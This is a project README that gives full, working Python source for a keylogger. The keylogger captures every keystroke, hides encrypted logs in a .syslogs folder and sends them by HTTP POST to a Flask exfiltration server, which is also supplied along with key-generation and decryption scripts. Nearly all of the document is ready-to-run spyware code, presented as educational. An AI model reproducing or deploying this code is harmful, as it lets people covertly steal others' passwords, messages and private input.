# 🔐 Keylogger with Encrypted Data Exfiltration

This project demonstrates the implementation of a **Python-based keylogger** that logs keystrokes, encrypts the data using symmetric encryption (`Fernet`), and **exfiltrates it** to a remote **Flask-based server** over HTTP POST requests. It includes a **kill switch**, **persistence logic**, and encrypted log storage.

---

## 🧠 Overview

- Logs every key pressed using `pynput`.
- Encrypts logs using a Fernet key (`cryptography` package).
- Stores logs locally in a hidden `.syslogs` directory.
- Periodically **exfiltrates** encrypted logs to a local Flask server.
- **Kill switch** supported via a `kill.flag` file.
- Built for educational, ethical, and simulation purposes only.

---

## 🛠 Tools & Libraries Used

- Python 3.10+
- [pynput](https://pypi.org/project/pynput/)
- [cryptography](https://pypi.org/project/cryptography/)
- Flask
- Requests

Install dependencies:

```bash
pip install pynput cryptography flask requests
````

---

## 📁 Project Structure

```
KEYLOGGER/
│
├── logger.py              # Main keylogger script
├── exfil_server.py        # Flask server for data exfiltration
├── encryption.key         # Fernet key (auto-generated)
├── decrypt_log.py         # Log decryption tool
├── kill.flag              # Kill switch file (optional)
├── .syslogs/              # Encrypted logs folder
└── received_data.bin      # Server-side received payloads
```

---

## 🧾 Step-by-Step Guide

### 🔑 Step 1: Generate Encryption Key

```python
# save as generate_key.py
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("encryption.key", "wb") as f:
    f.write(key)

print("Encryption key generated and saved as 'encryption.key'")
```

Run:

```bash
python generate_key.py
```

---

### 🎯 Step 2: Run Exfiltration Server

```python
# exfil_server.py
from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Create directory for logs if not present
RECEIVED_LOG_DIR = "exfil_received_logs"
os.makedirs(RECEIVED_LOG_DIR, exist_ok=True)

# Root route to verify server status
@app.route("/", methods=["GET"])
def home():
    return "🔐 Exfiltration Server is active. Awaiting POST requests at /exfil", 200

# Exfiltration endpoint supporting GET (for testing) and POST (for data)
@app.route("/exfil", methods=["GET", "POST"])
def receive_data():
    if request.method == "POST":
        payload = request.data
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        source_ip = request.remote_addr
        payload_size = len(payload)

        print(f"[INFO] [{timestamp}] Received {payload_size} bytes from {source_ip}")

        filename = os.path.join(RECEIVED_LOG_DIR, f"payload_{timestamp}.bin")
        with open(filename, "wb") as f:
            f.write(b"===== PAYLOAD START =====\n")
            f.write(f"[{timestamp}] From: {source_ip}\n".encode())
            f.write(payload)
            f.write(b"\n===== PAYLOAD END =====\n")

        # Optional logging
        with open(os.path.join(RECEIVED_LOG_DIR, "exfil_log.txt"), "a") as log:
            log.write(f"[INFO] [{timestamp}] Received {payload_size} bytes from {source_ip}\n")

        return "Payload received", 200
    else:
        # GET method: friendly message for browser/testing
        return "Send a POST request with encrypted payload to /exfil", 200

if __name__ == "__main__":
    # Run on all interfaces so you can connect remotely
    app.run(host="0.0.0.0", port=5000)
```

Run:

```bash
python exfil_server.py
```

---

### 🎹 Step 3: Launch the Keylogger

```python
# logger.py
import os
import datetime
import threading
import time
from pynput import keyboard
from cryptography.fernet import Fernet
import requests

# Constants
LOG_DIR = ".syslogs"
KEY_FILE = "encryption.key"  # Make sure this matches your file name exactly
EXFIL_URL = "http://localhost:5000/exfil"

# Load encryption key
with open(KEY_FILE, "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)
log = []

def ensure_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def encrypt_and_store(log_data):
    ensure_log_dir()
    if log_data:
        print("[+] Flushing and encrypting logs...")  # Moved here
        encrypted_data = fernet.encrypt("".join(log_data).encode())
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(LOG_DIR, f"log_{timestamp}.bin")
        with open(filename, "wb") as f:
            f.write(encrypted_data)
        simulate_exfil(filename)

def simulate_exfil(filepath):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
            response = requests.post(EXFIL_URL, data=data, timeout=5)
            if response.status_code == 200:
                print(f"[+] Exfiltrated {filepath} successfully.")
            else:
                print(f"[-] Exfiltration failed with status {response.status_code}")
    except Exception as e:
        print(f"[-] Exfiltration error: {e}")

def check_kill_switch():
    return os.path.exists("kill.flag")

def flush_log():
    global log
    if log:
        encrypt_and_store(log)
        log = []

def periodic_flush():
    while True:
        time.sleep(30)
        if check_kill_switch():
            flush_log()
            print("[*] Kill switch detected. Exiting.")
            exit()
        flush_log()

def on_press(key):
    try:
        log.append(str(key.char))
    except AttributeError:
        log.append(f"[{key}]")

def main():
    ensure_log_dir()
    print("[*] Logger started. Listening for keystrokes...")
    threading.Thread(target=periodic_flush, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
```

Run the logger:

```bash
python logger.py
```

Now type on your keyboard to generate logs. The logs will be flushed every 30 seconds.

---

### 🚫 Step 4: Kill Switch (Optional)

To stop the logger gracefully:

```bash
echo > kill.flag
```

The logger checks for this file every 30 seconds and terminates if found.

---

### 🔓 Step 5: Decrypt Logs

```python
# decrypt_log.py
import os
from cryptography.fernet import Fernet

LOG_DIR = ".syslogs"

# Load encryption key
with open("encryption.key", "rb") as f:
    key = f.read()

fernet = Fernet(key)

# Get list of files in .syslogs sorted by modified time, newest first
files = sorted(
    (os.path.join(LOG_DIR, f) for f in os.listdir(LOG_DIR) if f.endswith(".bin")),
    key=os.path.getmtime,
    reverse=True
)

if not files:
    print("No log files found in .syslogs directory.")
    exit()

latest_file = files[0]
print(f"Decrypting file: {latest_file}")

with open(latest_file, "rb") as f:
    encrypted_data = f.read()

try:
    decrypted_data = fernet.decrypt(encrypted_data)
    print("Decrypted log content:")
    print(decrypted_data.decode())
except Exception as e:
    print(f"Error decrypting file: {e}")
```

---

## ✅ Sample Output

```bash
[INFO] [2025-06-11 02:01:13] Received 238 bytes from 127.0.0.1
[+] Exfiltrated: .syslogs/log_20250611_020112.bin
[*] Kill switch detected.
```

---
